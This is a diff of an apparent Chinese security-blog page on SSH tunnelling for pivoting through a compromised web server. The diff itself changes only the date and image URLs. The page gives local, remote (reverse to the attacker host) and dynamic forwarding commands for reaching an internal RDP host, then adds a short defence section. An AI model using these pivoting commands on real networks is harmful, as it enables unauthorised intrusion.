@@ -420,7 +420,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-08
+                    2021-08-04
                 </div>
                 
 
@@ -466,7 +466,7 @@
  -p 指定 SSH 端口</code></pre>
 <h1 id="0x02-本地转发"><a href="#0x02-本地转发" class="headerlink" title="0x02 本地转发"></a>0x02 本地转发</h1><p>目前有这样的一个环境，外网有一台攻击主机 ，可访问处于内网环境的 Web 服务器（双网卡），但无法访问 Web 服务器所在内网的办公主机，接下来就用 SSH 进行流量转发，使外网的攻击主机通过 Web 服务器访问到位于内网的办公主机。</p>
 <p>环境拓扑如下：</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh1.jpg"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh1.jpg?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>在攻击主机上执行以下命令，将内网办公主机的 3389 端口映射到自己的 3388 端口上</p>
 <pre><code>ssh -CfNg -L 攻击主机端口:内网办公主机IP:内网办公主机端口 Web服务器ssh用户名@Web服务器IP</code></pre>
 <pre><code class="#">&gt; ssh -CfNg -L 3388:192.168.7.110:3389 root@172.16.214.5
@@ -479,10 +479,10 @@ tcp        0      0 0.0.0.0:3388            0.0.0.0:*               LISTEN      
 tcp6       0      0 :::3388                 :::*                    LISTEN      14086/ssh</code></pre>
 <p>可以看到 ssh 程序已经监听 3388 端口了，接下来连接本地的 3388 端口就可以连接到内网办公主机的 3389 端口了</p>
 <pre><code>rdesktop 127.0.0.1:3388</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh2.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h1 id="0x03-远程转发"><a href="#0x03-远程转发" class="headerlink" title="0x03 远程转发"></a>0x03 远程转发</h1><p>远程转发在这里其实也可以说是反向代理，目前有这样的一个环境：内网中不存在边界设备，但是内网的 Web 服务器能访问到攻击主机，而内网的办公主机则不行。</p>
 <p>因此可以在拿到 Web 服务器的 Shell 后，采用远程转发的方式，即利用 Web 服务器 SSH 连接到攻击主机上进行代理转发，然后访问攻击主机的端口即可，拓扑图如下：</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh3.jpg"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh3.jpg?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>将 Web 服务器作为跳板，进行远程转发</p>
 <pre><code>ssh -CfNg -R 攻击主机端口:内网办公主机IP:内网办公主机端口 攻击主机ssh用户名@攻击主机IP</code></pre>
 <pre><code>&gt; ssh -CfNg -R 3388:192.168.7.110:3389 root@172.16.214.48
@@ -495,7 +495,7 @@ tcp6       0      0 ::1:3388                :::*                    LISTEN      
 <p>可以看到，同样的，在攻击主机上 3388 端口的监听已经被开启了，此时直接在攻击主机上访问 127.0.0.1:3388 就可以连接到 192.168.7.110:3389 了</p>
 <pre><code>rdesktop 127.0.0.1:3388</code></pre>
 <h1 id="0x04-动态转发"><a href="#0x04-动态转发" class="headerlink" title="0x04 动态转发"></a>0x04 动态转发</h1><p>动态转发需要攻击主机能够访问到目标主机，因此这里采用和本地转发一样的拓扑进行演示。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh1.jpg"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh1.jpg?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>在攻击主机上执行下面的命令</p>
 <pre><code>ssh -CfNg -D 攻击主机端口 Web服务器ssh用户名@Web服务器IP</code></pre>
 <pre><code>&gt; ssh -CfNg -D 4444 root@172.16.214.5
@@ -513,7 +513,7 @@ tcp6       0      0 :::4444                 :::*                    LISTEN      
 <p>修改后之后，按下<code>esc</code>，然后按下<code>:wq</code> 保存退出</p>
 <p>之后使用下面的命令连接内网办公主机 192.168.7.110 的 3389 端口。</p>
 <pre><code>proxychains4 rdesktop 192.168.7.110:3389 </code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh4.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>可以看到动态转发要比本地转发自由度高出不少，借助动态转发可以访问到内网 Web 服务器能访问的所有地址、端口，没有了本地转发只能访问单个IP、端口的限制。</p>
 <h1 id="0x05-SSH-隧道攻击的防御"><a href="#0x05-SSH-隧道攻击的防御" class="headerlink" title="0x05 SSH 隧道攻击的防御"></a>0x05 SSH 隧道攻击的防御</h1><p>对 SSH 进行双向访问控制策略可以避免这些问题，一方面只允许可信 IP 才能连接，一方面只允许连接到可信 IP。</p>
 <blockquote>
